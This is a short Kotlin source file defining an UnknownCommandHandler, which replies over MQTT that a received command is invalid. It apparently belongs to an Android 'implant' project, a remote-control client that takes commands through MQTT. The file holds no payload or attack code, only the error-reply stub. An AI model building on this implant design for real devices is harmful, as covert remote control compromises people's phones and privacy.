package com.cooperthecoder.implant.command.handlers

import android.content.Context
import com.cooperthecoder.implant.command.Command
import org.eclipse.paho.android.service.MqttAndroidClient

class UnknownCommandHandler(context: Context, client: MqttAndroidClient, command: Command) : CommandHandler(context, client, command) {
    override fun action() {
        reply("", "${command.command} is not a valid command.")
    }

}